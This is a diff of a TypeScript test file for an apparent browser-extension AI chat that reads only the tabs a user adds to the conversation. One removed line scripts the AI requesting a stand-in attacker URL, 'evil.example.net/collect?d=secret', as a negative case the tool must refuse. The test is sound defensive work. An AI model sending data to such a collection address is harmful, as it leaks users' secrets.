@@ -88,24 +88,25 @@ async function ask(user: UserEvent, question: string) {
   await user.click(screen.getByRole('button', { name: 'Send' }))
 }
 
-const readTab = (url: string) => ({ toolCalls: [{ name: 'read_tab', arguments: JSON.stringify({ url }) }] })
+const readTab = (tab: number) => ({ toolCalls: [{ name: 'read_tab', arguments: JSON.stringify({ tab }) }] })
 
 /** The result read_tab gives for a page on news.example.com, as the model gets it. */
-const tabResult = (title: string, url: string, text: string) =>
+const tabResult = (tab: number, title: string, url: string, text: string, notes: string[] = []) =>
   [
     DATA_LINE,
-    `Page in a tab the user added, on news.example.com: ${JSON.stringify({ title, url })}`,
+    `Page in tab ${tab}, which the user added, on news.example.com: ${JSON.stringify({ title, url })}`,
+    ...notes,
     'Text:',
     text,
   ].join('\n')
 
-const NOT_ADDED =
-  'The user did not add a tab with this URL to this chat, so it was not read: read_tab reads only the tabs the ' +
+const notAdded = (tab: number) =>
+  `The user did not add tab ${tab} to this chat, so it was not read: read_tab reads only the tabs the ` +
   'notes list as added. Ask the user to add the tab, with "+" or @ in the message box.'
 
 const GONE =
-  'No tab in this window shows this URL any more: the user closed the tab or it went to another page, so ' +
-  'nothing was read. Ask them to open the page and add its tab again.'
+  'The tab the user added is not open any more (it was closed, or the browser restarted since), so nothing ' +
+  'was read. Ask them to open the page and add its tab again.'
 
 describe('UC-NOTICO-CHAT-005 add open tabs to a conversation', () => {
   it("[UC-NOTICO-CHAT-005-S01] the picker lists the window's tabs on other sites, filtered by what is typed, and reads nothing of them", async () => {
@@ -173,7 +174,7 @@ describe('UC-NOTICO-CHAT-005 add open tabs to a conversation', () => {
     expect(sentQuestions(browser)).toEqual([
       '[The current tab is not a Notion page.]\n' +
         '[Tabs on other sites the user added to this question, read with read_tab: ' +
-        `"Rivers | News", ${RIVERS}; "Lakes | News", ${LAKES_NOTED}]\n\n` +
+        `"Rivers | News" (tab 20), ${RIVERS}; "Lakes | News" (tab 21), ${LAKES_NOTED}]\n\n` +
         'Compare these',
     ])
     expect(tab.injections).toEqual([])
@@ -181,12 +182,12 @@ describe('UC-NOTICO-CHAT-005 add open tabs to a conversation', () => {
     // The next question starts without them.
     expect(screen.queryByRole('list', { name: 'Pages to send' })).toBeNull()
 
-    // A tab still open is gone to; one that shows the page no more is opened again.
+    // A tab still open is gone to; one closed since has its page opened again.
     await user.click(
       within(conversation().getByRole('list', { name: 'Pages sent' })).getByRole('link', { name: 'Lakes | News' }),
     )
     expect(tab.url).toBe(LAKES)
-    tab.otherTabs[0].url = 'https://news.example.com/2026/front'
+    tab.otherTabs[0].closed = true
     await user.click(
       within(conversation().getByRole('list', { name: 'Pages sent' })).getByRole('link', { name: 'Rivers | News' }),
     )
@@ -201,17 +202,16 @@ describe('UC-NOTICO-CHAT-005 add open tabs to a conversation', () => {
     expect(pagesSent()).toEqual([['Rivers | News', 'Lakes | News']])
   })
 
-  it('[UC-NOTICO-CHAT-005-S04] the AI reads a tab added to the chat, also in a later question, and no address the user did not add', async () => {
+  it('[UC-NOTICO-CHAT-005-S04] the AI reads a tab added to the chat, also in a later question, and no tab the user did not add', async () => {
     const { browser, tab, user } = await openPanel((t) => t.allowed.add('https://shop.example.org/*'))
     browser.ai.script.push(
-      readTab(RIVERS),
-      // As the note names it.
-      readTab(LAKES_NOTED),
+      readTab(20),
+      readTab(21),
       { reply: 'Rivers are rising.' },
-      readTab(RIVERS),
-      // Open in the window, on a site Notico may read, but never added; and a link from a page.
-      readTab(SHOP),
-      readTab('https://evil.example.net/collect?d=secret'),
+      readTab(20),
+      // Open in the window, on a site Notico may read, but never added; and the current tab.
+      readTab(22),
+      readTab(7),
       { reply: 'Still rising.' },
     )
 
@@ -224,13 +224,13 @@ describe('UC-NOTICO-CHAT-005 add open tabs to a conversation', () => {
     await screen.findByText('Still rising.')
 
     expect(toolResults(browser)).toEqual([
-      tabResult('Rivers | News', RIVERS, 'Rivers are rising.'),
-      tabResult('Lakes | News', LAKES, 'Lakes are calm.'),
-      tabResult('Rivers | News', RIVERS, 'Rivers are rising.'),
-      NOT_ADDED,
-      NOT_ADDED,
+      tabResult(20, 'Rivers | News', RIVERS, 'Rivers are rising.'),
+      tabResult(21, 'Lakes | News', LAKES, 'Lakes are calm.'),
+      tabResult(20, 'Rivers | News', RIVERS, 'Rivers are rising.'),
+      notAdded(22),
+      notAdded(7),
     ])
-    // The added tab only, in the tab itself, never the current one.
+    // The added tabs only, in the tabs themselves.
     expect(tab.injections).toEqual([
       { tabId: 20, world: 'ISOLATED' },
       { tabId: 21, world: 'ISOLATED' },
@@ -238,43 +238,55 @@ describe('UC-NOTICO-CHAT-005 add open tabs to a conversation', () => {
     ])
   })
 
-  it('[UC-NOTICO-CHAT-005-S04] a long address is named clipped and read by that name', async () => {
-    const LONG = `https://news.example.com/play#state=${'a'.repeat(3_000)}`
-    const NAMED = LONG.slice(0, 2_000)
-    const { browser, tab, user } = await openPanel((t) => {
-      t.otherTabs[0] = { url: LONG, title: 'Playground', dom: webPage({ title: 'Playground', main: 'Some code.' }) }
-    })
-    browser.ai.script.push(readTab(NAMED), readTab(LAKES_NOTED), { reply: 'Read both.' })
-
-    await addTab(user, 'Playground')
-    await addTab(user, 'Lakes')
-    await ask(user, 'What do these say?')
-    await screen.findByText('Read both.')
-
-    // The note names the address clipped, and the model reads it by that name.
-    expect(sentQuestions(browser)[0]).toContain(`"Playground", ${NAMED}; `)
-    expect(sentQuestions(browser)[0]).not.toContain(LONG)
-    expect(toolResults(browser)[0]).toMatch(
-      /^.*\nPage in a tab the user added, on news\.example\.com: .*\nText:\nSome code\.$/s,
-    )
-    expect(toolResults(browser)[1]).toBe(tabResult('Lakes | News', LAKES, 'Lakes are calm.'))
-    expect(tab.injections).toEqual([
-      { tabId: 20, world: 'ISOLATED' },
-      { tabId: 21, world: 'ISOLATED' },
-    ])
-  })
-
-  it('[UC-NOTICO-CHAT-005-S05] a tab added that was closed or went to another page is not read', async () => {
+  it('[UC-NOTICO-CHAT-005-S04] a tab that went to another page is read as it is now, and the AI is told it moved', async () => {
     const { browser, tab, user } = await openPanel()
-    browser.ai.script.push(readTab(RIVERS), readTab(LAKES), { reply: 'They are gone.' })
+    browser.ai.script.push(readTab(20), { reply: 'It moved.' })
 
     await addTab(user, 'Rivers')
+    Object.assign(tab.otherTabs[0], {
+      url: 'https://news.example.com/2026/front',
+      title: 'Front | News',
+      dom: webPage({ title: 'Front | News', main: 'Today on the front page.' }),
+    })
+    await ask(user, 'What does it say?')
+    await screen.findByText('It moved.')
+
+    expect(toolResults(browser)).toEqual([
+      tabResult(20, 'Front | News', 'https://news.example.com/2026/front', 'Today on the front page.', [
+        `[The tab went to another page since the user added it, when it showed ${JSON.stringify(RIVERS)}.]`,
+      ]),
+    ])
+  })
+
+  it('[UC-NOTICO-CHAT-005-S03] a long address is named clipped in the note', async () => {
+    const LONG = `https://news.example.com/play#state=${'a'.repeat(3_000)}`
+    const { browser, user } = await openPanel((t) => {
+      t.otherTabs[0] = { url: LONG, title: 'Playground', dom: webPage({ title: 'Playground', main: 'Some code.' }) }
+    })
+    browser.ai.script.push({ reply: 'Noted.' })
+
+    await addTab(user, 'Playground')
+    await ask(user, 'What is this?')
+    await screen.findByText('Noted.')
+
+    expect(sentQuestions(browser)[0]).toContain(`"Playground" (tab 20), ${LONG.slice(0, 2_000)}]`)
+  })
+
+  it('[UC-NOTICO-CHAT-005-S05] a tab added that was closed, or added before the browser restarted, is not read', async () => {
+    const { browser, tab, user } = await openPanel()
+    browser.ai.script.push(readTab(20), { reply: 'It is gone.' }, readTab(21), { reply: 'Gone too.' })
+
+    await addTab(user, 'Rivers')
+    tab.otherTabs[0].closed = true
+    await ask(user, 'What does it say?')
+    await screen.findByText('It is gone.')
+    await answered()
+
+    // After a restart Chrome hands out tab ids again: an id a chat kept may be another tab's now.
     await addTab(user, 'Lakes')
-    // A fragment counts: an app that routes by it shows another document under another one.
-    tab.otherTabs[0].url = `${RIVERS}#/inbox/2`
-    tab.otherTabs.splice(1, 1)
-    await ask(user, 'Compare these')
-    await screen.findByText('They are gone.')
+    tab.storage.restart()
+    await ask(user, 'And this one?')
+    await screen.findByText('Gone too.')
 
     expect(toolResults(browser)).toEqual([GONE, GONE])
     expect(tab.injections).toEqual([])
